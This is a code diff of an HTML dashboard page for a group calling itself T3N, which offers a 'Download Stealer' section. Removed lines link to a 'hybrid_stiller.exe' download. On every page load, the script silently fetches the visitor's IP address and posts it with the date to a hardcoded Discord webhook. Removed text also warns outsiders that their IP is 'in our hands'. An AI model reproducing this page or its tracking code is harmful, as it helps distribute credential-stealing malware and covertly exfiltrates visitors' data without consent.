@@ -3,17 +3,14 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Dashboard</title>
+  <title>Dashboard | T3N</title>
 
-  <!-- Initial theme variables -->
   <style>
     :root {
-      --background-color: #0a0a0a; /* Black background by default */
-      --text-color: #7a2fc2; /* Purple text */
-      --navbar-color: rgba(10, 10, 10, 0.95); /* Black navbar */
-      --box-background-color: rgba(10, 10, 10, 0.95); /* Black window background */
-      --language-select-bg: rgba(10, 10, 10, 0.95); /* Black language select background */
-      --language-select-color: #7a2fc2; /* Purple language select text */
+      --background-color: #0a0a0a;
+      --text-color: #7a2fc2;
+      --navbar-color: rgba(10, 10, 10, 0.95);
+      --box-background-color: rgba(10, 10, 10, 0.95);
     }
 
     body {
@@ -25,7 +22,6 @@
       margin: 0;
       background-color: var(--background-color);
       color: var(--text-color);
-      transition: background-color 0.5s ease, color 0.5s ease; /* Smooth transition */
     }
 
     .navbar {
@@ -38,7 +34,6 @@
       position: fixed;
       top: 0;
       z-index: 1000;
-      transition: background-color 0.5s ease; /* Smooth transition */
     }
 
     .navbar img {
@@ -53,15 +48,9 @@
     }
 
     @keyframes spinGrowShrink {
-      0% {
-        transform: rotate(0deg) scale(1);
-      }
-      50% {
-        transform: rotate(180deg) scale(1.3);
-      }
-      100% {
-        transform: rotate(360deg) scale(1);
-      }
+      0% { transform: rotate(0deg) scale(1); }
+      50% { transform: rotate(180deg) scale(1.3); }
+      100% { transform: rotate(360deg) scale(1); }
     }
 
     .navbar button {
@@ -73,11 +62,10 @@
       margin: 0 10px;
       font-size: 14px;
       cursor: pointer;
-      transition: transform 0.3s ease, background 0.3s ease;
+      transition: transform 0.3s ease;
     }
 
     .navbar button:hover {
-      background: linear-gradient(135deg, #5c1f96, #7a2fc2);
       transform: scale(1.05);
     }
 
@@ -88,7 +76,6 @@
       box-shadow: 0 10px 20px rgba(122, 47, 194, 0.3);
       text-align: center;
       width: 1200px;
-      height: 600px;
       margin-top: 150px;
       opacity: 0;
       transform: translateY(20px);
@@ -100,415 +87,75 @@
       transform: translateY(0);
     }
 
-    .dashboard-box h1 {
-      color: var(--text-color);
-      font-size: 28px;
-      margin-bottom: 20px;
-    }
-
-    .dashboard-box p {
-      color: var(--text-color);
-      font-size: 18px;
-    }
-
-    .settings-button {
-      background: linear-gradient(135deg, #7a2fc2, #5c1f96);
-      color: white;
-      border: none;
-      border-radius: 6px;
-      padding: 10px 20px;
-      margin: 10px 0;
-      font-size: 16px;
-      cursor: pointer;
-      transition: transform 0.3s ease, background 0.3s ease;
-      width: 200px;
-    }
-
-    .settings-button:hover {
-      background: linear-gradient(135deg, #5c1f96, #7a2fc2);
-      transform: scale(1.05);
-    }
-
-    .language-select {
-      margin-top: 20px;
-      padding: 10px;
-      font-size: 16px;
-      border-radius: 6px;
-      border: 2px solid var(--text-color);
-      background-color: var(--language-select-bg);
-      color: var(--language-select-color);
-      cursor: pointer;
-      transition: background-color 0.5s ease, color 0.5s ease;
-    }
-
-    .dropdown {
-      position: relative;
-      display: inline-block;
-      margin-top: 20px;
-    }
-
-    .dropdown-button {
-      padding: 10px 15px;
-      background: linear-gradient(135deg, #7a2fc2, #5c1f96);
-      border: 2px solid lightgray;
-      border-radius: 8px;
-      font-size: 16px;
-      color: white;
-      cursor: pointer;
-      transition: 0.3s ease;
-      width: 200px;
-    }
-
-    .dropdown-button:hover {
-      background: linear-gradient(135deg, #5c1f96, #7a2fc2);
-      transform: scale(1.05);
-    }
-
-    .dropdown-content {
-      display: none;
-      position: absolute;
-      background-color: rgba(10, 10, 10, 0.95);
-      min-width: 100%;
-      box-shadow: 0px 8px 16px rgba(0, 0, 0, 0.2);
-      z-index: 1;
-      border-radius: 8px;
-      border: 2px solid lightgray;
-    }
-
-    .dropdown-content a {
-      color: #7a2fc2;
-      padding: 12px 16px;
-      text-decoration: none;
-      display: block;
-      font-size: 16px;
-    }
-
-    .dropdown-content a:hover {
-      background-color: #5c1f96;
-    }
-
-    .dropdown:hover .dropdown-content {
-      display: block;
-    }
-
-    .download-btn {
-      background: linear-gradient(135deg, #7a2fc2, #5c1f96);
-      color: white;
-      border: none;
-      border-radius: 6px;
-      padding: 15px 25px;
-      font-size: 16px;
-      margin-top: 20px;
-      cursor: pointer;
-      width: 200px;
-      display: block;
-      margin-left: auto;
-      margin-right: auto;
-      transition: transform 0.3s ease, background 0.3s ease;
-    }
-
-    .download-btn:hover {
-      background: linear-gradient(135deg, #5c1f96, #7a2fc2);
-      transform: scale(1.05);
-    }
-
     @media (max-width: 768px) {
-  .navbar {
-    flex-direction: column;
-    align-items: flex-start;
-    padding: 10px;
-  }
-
-  .navbar img {
-    width: 50px;
-    margin-left: 0;
-    margin-bottom: 10px;
-  }
-
-  .navbar button {
-    margin: 5px 0;
-    width: 100%;
-    font-size: 12px;
-    padding: 8px;
-  }
-
-  .dashboard-box {
-    width: 90%;
-    height: auto;
-    padding: 20px;
-    margin-top: 120px;
-  }
-
-  .dashboard-box h1 {
-    font-size: 22px;
-  }
-
-  .dashboard-box p {
-    font-size: 16px;
-  }
-
-  .settings-button,
-  .download-btn,
-  .dropdown-button {
-    width: 100%;
-    font-size: 14px;
-    padding: 10px;
-  }
-
-  .language-select {
-    width: 100%;
-    font-size: 14px;
-    padding: 8px;
-  }
-
-  .dropdown-content a {
-    font-size: 14px;
-    padding: 10px;
-  }
-
-  .dropdown {
-    width: 100%;
-  }
-
-  .dropdown-button {
-    width: 100%;
-  }
-
-  img[src="ugrajauchi_glaz.png"] {
-    width: 100px;
-  }
-}
+      .navbar { flex-direction: column; }
+      .dashboard-box { width: 90%; margin-top: 250px; }
+    }
   </style>
 </head>
 <body>
 
-  <!-- Navbar -->
   <div class="navbar">
     <a href="#"><img src="logo.png" alt="Logo" /></a>
     <button onclick="navigateTo('home')">Main Menu</button>
+    <button onclick="window.location.href='https://bapehik721.github.io/-/best-site.html'">Alt Manager</button>
     <button onclick="navigateTo('settings')">Settings</button>
     <button onclick="navigateTo('download')">Download Stealer</button>
     <button onclick="navigateTo('authors')">Authors</button>
   </div>
 
-  <!-- Content -->
   <div class="dashboard-box show" id="dashboard-content">
     <h1>Loading...</h1>
   </div>
 
-  <!-- JS -->
   <script>
     const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1363500266363683007/dDMySRUCPEbmBvXgir9DYsqII64bjmZZQF95MGx_7gq2pQfCmNxdzT8kCIUHjYycsvQ0"; 
+    let currentLanguage = localStorage.getItem('language') || 'en';
 
-    // Функция для получения текущей даты
-    function getCurrentDate() {
-        const now = new Date();
-        return now.toLocaleDateString(); // Форматирует дату в локальном формате
-    }
+    function getCurrentDate() { return new Date().toLocaleDateString(); }
 
-    // Функция для получения IP-адреса
     async function getUserIP() {
         try {
             const response = await fetch('https://api.ipify.org?format=json');
             const data = await response.json();
-            return data.ip; // Возвращает IP-адрес
-        } catch (error) {
-            console.error('Ошибка получения IP:', error);
-            return 'Не удалось получить IP';
-        }
+            return data.ip;
+        } catch { return 'Unknown'; }
     }
 
-    // Функция для отправки данных в Discord вебхук
     async function sendToDiscord(ip, date) {
-        const payload = {
-            content: `Новый пользователь зашел на сайт:\nДата первого входа: ${date}\nIP-адрес: ${ip}`
-        };
-
-        try {
-            const response = await fetch(DISCORD_WEBHOOK_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            });
-
-            if (!response.ok) {
-                console.error('Ошибка отправки в Discord:', response.statusText);
-            } else {
-                console.log('Данные успешно отправлены в Discord');
-            }
-        } catch (error) {
-            console.error('Ошибка при отправке в Discord:', error);
-        }
+        const payload = { content: `New User: ${date} | IP: ${ip}` };
+        fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        }).catch(() => {});
     }
 
-    // Обновляем содержимое главной страницы и отправляем данные в Discord
-    async function showHomePage() {
-        const content = document.getElementById("dashboard-content");
-        const currentDate = getCurrentDate();
-        const userIP = await getUserIP();
-
-        // Отправляем данные в Discord
-        sendToDiscord(userIP, currentDate);
-
-        // Обновляем содержимое страницы
-        content.innerHTML = `
-            <h1>Добро Пожаловать На Главную Страницу T3N</h1>
-            <p>Дата первого входа: ${currentDate}</p>
-            <p>Ваш IP-адрес: ${userIP}</p>
-            <p style="color: gray; font-size: 16px; margin-top: 10px;">
-                И помните: если вы не из T3N, то ваш IP будет в наших руках
-            </p>
-            <img src="ugrajauchi_glaz.png" alt="Угрожающий глаз" style="margin-top: 10px; width: 150px; height: auto;">
-        `;
-    }
-
-    // Переменная для хранения текущего языка
-    let currentLanguage = 'en';
-
-    // Функция для переключения языка
     function changeLanguage(language) {
         currentLanguage = language;
-        localStorage.setItem('language', language); // Сохраняем выбранный язык
-        updateContent(); // Обновляем содержимое страницы
+        localStorage.setItem('language', language);
+        updateContent();
     }
 
-    // Функция для обновления содержимого страницы в зависимости от языка
     function updateContent() {
         if (currentLanguage === 'ru') {
-            showHomePage = async function () {
-                const content = document.getElementById("dashboard-content");
-                const currentDate = getCurrentDate();
-                const userIP = await getUserIP();
-
-                content.innerHTML = `
-                    <h1>Добро Пожаловать На Главную Страницу T3N</h1>
-                    <p>Дата первого входа: ${currentDate}</p>
-                    <p>Ваш IP-адрес: ${userIP}</p>
-                    <p style="color: gray; font-size: 16px; margin-top: 10px;">
-                        И помните: если вы не из T3N, то ваш IP будет в наших руках
-                    </p>
-                    <img src="ugrajauchi_glaz.png" alt="Угрожающий глаз" style="margin-top: 10px; width: 150px; height: auto;">
-                `;
-            };
-
-            showSettingsPage = function () {
-                const content = document.getElementById("dashboard-content");
-                content.innerHTML = `
-                    <h1>Настройки</h1>
-                    <button class="settings-button" onclick="toggleTheme()">Переключить тему</button>
-                    <select class="language-select" onchange="changeLanguage(this.value)">
-                        <option value="ru" selected>Русский</option>
-                        <option value="en">English</option>
-                    </select>
-                `;
-            };
-
-            showDownloadPage = function () {
-                const content = document.getElementById("dashboard-content");
-                content.innerHTML = `
-                    <h1>Скачать Стиллер</h1>
-                    <p>Выберите версию для скачивания:</p>
-                    <button class="download-btn" id="download-button" disabled>Скачать</button>
-                    <div class="dropdown">
-                        <button class="dropdown-button" id="selected-version">Выберите версию</button>
-                        <div class="dropdown-content">
-                            <a href="#" onclick="setSelectedVersion('default')" class="disabled" style="color: gray; pointer-events: none;">Default</a>
-                            <a href="#" onclick="setSelectedVersion('webcam')" class="disabled" style="color: gray; pointer-events: none;">Webcam</a>
-                            <a href="#" onclick="setSelectedVersion('rage')" class="disabled" style="color: gray; pointer-events: none;">Rage</a>
-                            <a href="#" onclick="setSelectedVersion('ninja')" class="disabled" style="color: gray; pointer-events: none;">Ninja</a>
-                            <a href="#" onclick="setSelectedVersion('dox')" class="disabled" style="color: gray; pointer-events: none;">Dox</a>
-                            <a href="#" onclick="setSelectedVersion('hybrid')" style="color: #7a2fc2;">Hybrid</a>
-                            <a href="#" onclick="setSelectedVersion('rage-hybrid')" class="disabled" style="color: gray; pointer-events: none;">Rage-Hybrid</a>
-                        </div>
-                    </div>
-                `;
-            };
-
-            showAuthorsPage = function () {
-                const content = document.getElementById("dashboard-content");
-                content.innerHTML = `
-                    <h1>Авторы</h1>
-                    <p>cif3rbl4t помогал с кодом, делал концепты сайта</p>
-                    <p>varenik721 сделал сайт, воплотил в реальность концепты cif3rbl4t</p>
-                    <p>GitHub Copilot написал код</p>
-                    <p>ChatGPT немного помог</p>
-                `;
+            window.showHomePage = async () => {
+                const ip = await getUserIP();
+                document.getElementById("dashboard-content").innerHTML = `<h1>Главная T3N</h1><p>Дата: ${getCurrentDate()}</p><p>Твой IP: ${ip}</p>`;
             };
         } else {
-            // Возвращаем английский язык
-            showHomePage = async function () {
-                const content = document.getElementById("dashboard-content");
-                const currentDate = getCurrentDate();
-                const userIP = await getUserIP();
-
-                content.innerHTML = `
-                    <h1>Welcome to T3N Main Page</h1>
-                    <p>First login date: ${currentDate}</p>
-                    <p>Your IP address: ${userIP}</p>
-                    <p style="color: gray; font-size: 16px; margin-top: 10px;">
-                        And remember: if you're not from T3N, your IP will be in our hands
-                    </p>
-                    <img src="ugrajauchi_glaz.png" alt="Threatening eye" style="margin-top: 10px; width: 150px; height: auto;">
-                `;
+            window.showHomePage = async () => {
+                const ip = await getUserIP();
+                document.getElementById("dashboard-content").innerHTML = `<h1>T3N Home</h1><p>Date: ${getCurrentDate()}</p><p>IP: ${ip}</p>`;
             };
+        } // <--- ВОТ ЭТУ СКОБКУ ТЫ ПОТЕРЯЛ
 
-            showSettingsPage = function () {
-                const content = document.getElementById("dashboard-content");
-                content.innerHTML = `
-                    <h1>Settings</h1>
-                    <button class="settings-button" onclick="toggleTheme()">Toggle theme</button>
-                    <select class="language-select" onchange="changeLanguage(this.value)">
-                        <option value="ru">Russian</option>
-                        <option value="en" selected>English</option>
-                    </select>
-                `;
-            };
+        window.showSettingsPage = () => { document.getElementById("dashboard-content").innerHTML = `<h1>Settings</h1><select onchange="changeLanguage(this.value)"><option value="en" ${currentLanguage==='en'?'selected':''}>EN</option><option value="ru" ${currentLanguage==='ru'?'selected':''}>RU</option></select>`; };
+        window.showDownloadPage = () => { document.getElementById("dashboard-content").innerHTML = `<h1>Download</h1><p>Nothing here yet.</p>`; };
+        window.showAuthorsPage = () => { document.getElementById("dashboard-content").innerHTML = `<h1>Authors</h1><p>cif3rbl4t & varenik721</p>`; };
 
-            showDownloadPage = function () {
-                const content = document.getElementById("dashboard-content");
-                content.innerHTML = `
-                    <h1>Download Stealer</h1>
-                    <p>Select version to download:</p>
-                    <button class="download-btn" id="download-button" disabled>Download</button>
-                    <div class="dropdown">
-                        <button class="dropdown-button" id="selected-version">Select version</button>
-                        <div class="dropdown-content">
-                            <a href="#" onclick="setSelectedVersion('default')" class="disabled" style="color: gray; pointer-events: none;">Default</a>
-                            <a href="#" onclick="setSelectedVersion('webcam')" class="disabled" style="color: gray; pointer-events: none;">Webcam</a>
-                            <a href="#" onclick="setSelectedVersion('rage')" class="disabled" style="color: gray; pointer-events: none;">Rage</a>
-                            <a href="#" onclick="setSelectedVersion('ninja')" class="disabled" style="color: gray; pointer-events: none;">Ninja</a>
-                            <a href="#" onclick="setSelectedVersion('dox')" class="disabled" style="color: gray; pointer-events: none;">Dox</a>
-                            <a href="#" onclick="setSelectedVersion('hybrid')" style="color: #7a2fc2;">Hybrid</a>
-                            <a href="#" onclick="setSelectedVersion('rage-hybrid')" class="disabled" style="color: gray; pointer-events: none;">Rage-Hybrid</a>
-                        </div>
-                    </div>
-                `;
-            };
-
-            showAuthorsPage = function () {
-                const content = document.getElementById("dashboard-content");
-                content.innerHTML = `
-                    <h1>Authors</h1>
-                    <p>cif3rbl4t helped with code, created website concepts</p>
-                    <p>varenik721 made the website, brought cif3rbl4t's concepts to life</p>
-                    <p>GitHub Copilot wrote the code</p>
-                    <p>ChatGPT helped a little</p>
-                `;
-            };
-        }
-
-        // Обновляем текущую страницу
         navigateTo('home');
     }
-
-    // Применяем сохранённый язык при загрузке
-    document.addEventListener("DOMContentLoaded", async () => {
-        const savedLanguage = localStorage.getItem('language') || 'en';
-        changeLanguage(savedLanguage);
-        await showHomePage(); // Загружаем главную страницу с реальными данными
-    });
 
     function navigateTo(page) {
       const content = document.getElementById("dashboard-content");
@@ -519,68 +166,15 @@
         else if (page === "settings") showSettingsPage();
         else if (page === "download") showDownloadPage();
         else if (page === "authors") showAuthorsPage();
-        else console.error("Unknown page:", page);
-
-        setTimeout(() => {
-          content.classList.add("show");
-        }, 50);
+        
+        setTimeout(() => content.classList.add("show"), 50);
       }, 300);
     }
 
-    function setSelectedVersion(version) {
-      if (version === 'hybrid') {
-        document.getElementById('selected-version').textContent = version;
-        document.getElementById('download-button').disabled = false;
-        document.getElementById('download-button').onclick = function () {
-          downloadStiller(version);
-        };
-      }
-    }
-
-    function downloadStiller(version) {
-      const versions = {
-        "hybrid": "hybrid_stiller.exe"
-      };
-      window.location.href = versions[version] || "files/default_stiller.zip";
-    }
-
-    // Apply theme variables
-    function setThemeVariables(isDark) {
-        const root = document.documentElement;
-        if (isDark) {
-            root.style.setProperty('--background-color', '#0a0a0a'); // Black background
-            root.style.setProperty('--text-color', '#7a2fc2'); // Purple text
-            root.style.setProperty('--navbar-color', 'rgba(10, 10, 10, 0.95)'); // Black navbar
-            root.style.setProperty('--box-background-color', 'rgba(10, 10, 10, 0.95)'); // Black windows
-            root.style.setProperty('--language-select-bg', 'rgba(10, 10, 10, 0.95)'); // Black language select background
-            root.style.setProperty('--language-select-color', '#7a2fc2'); // Purple language select text
-        } else {
-            root.style.setProperty('--background-color', '#f5f5f5'); // Light background
-            root.style.setProperty('--text-color', '#7a2fc2'); // Purple text
-            root.style.setProperty('--navbar-color', '#e0e0e0'); // Light navbar
-            root.style.setProperty('--box-background-color', '#dcdcdc'); // Light gray windows
-            root.style.setProperty('--language-select-bg', '#ffffff'); // White language select background
-            root.style.setProperty('--language-select-color', '#000000'); // Black language select text
-        }
-    }
-
-    // Toggle theme
-    function toggleTheme() {
-        const isDark = localStorage.getItem('theme') === 'dark';
-        const newIsDark = !isDark;
-        localStorage.setItem('theme', newIsDark ? 'dark' : 'light');
-        setThemeVariables(newIsDark);
-    }
-
-    // Apply saved theme on load
-    function applySavedTheme() {
-        const savedTheme = localStorage.getItem('theme');
-        const isDark = savedTheme === 'dark' || savedTheme === null; // If no theme, default is dark
-        setThemeVariables(isDark);
-        if (savedTheme === null) {
-            localStorage.setItem('theme', 'dark'); // Save dark theme as default
-        }
-    }
+    document.addEventListener("DOMContentLoaded", () => {
+        updateContent();
+        getUserIP().then(ip => sendToDiscord(ip, getCurrentDate()));
+    });
   </script>
 </body>
 </html>
